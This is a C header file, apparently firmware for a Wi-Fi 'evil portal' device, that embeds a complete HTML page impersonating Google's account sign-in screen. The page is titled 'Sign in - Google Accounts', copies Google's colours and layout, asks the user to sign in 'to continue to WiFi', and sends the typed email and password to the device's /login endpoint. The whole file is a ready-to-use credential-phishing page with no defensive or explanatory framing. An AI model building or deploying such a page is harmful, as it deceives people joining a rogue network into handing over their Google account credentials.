#ifndef PORTAL_GOOGLE_H
#define PORTAL_GOOGLE_H

const char PORTAL_GOOGLE_HTML[] = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #f0f4f9;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 48px 40px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 450px;
            border: 1px solid #dadce0;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .logo svg {
            height: 24px;
        }
        .google-text {
            display: flex;
            justify-content: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        .google-text span:nth-child(1) { color: #4285f4; }
        .google-text span:nth-child(2) { color: #ea4335; }
        .google-text span:nth-child(3) { color: #fbbc05; }
        .google-text span:nth-child(4) { color: #4285f4; }
        .google-text span:nth-child(5) { color: #34a853; }
        .google-text span:nth-child(6) { color: #ea4335; }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 32px;
        }
        .form-group {
            margin-bottom: 24px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }
        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .forgot {
            display: block;
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 32px;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .create-account:hover {
            text-decoration: underline;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        button:hover {
            background: #1557b0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-text">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to WiFi</p>
        <form action="/login" method="GET">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <a href="#" class="forgot">Forgot email?</a>
            <div class="buttons">
                <a href="#" class="create-account">Create account</a>
                <button type="submit">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
)rawliteral";

#endif
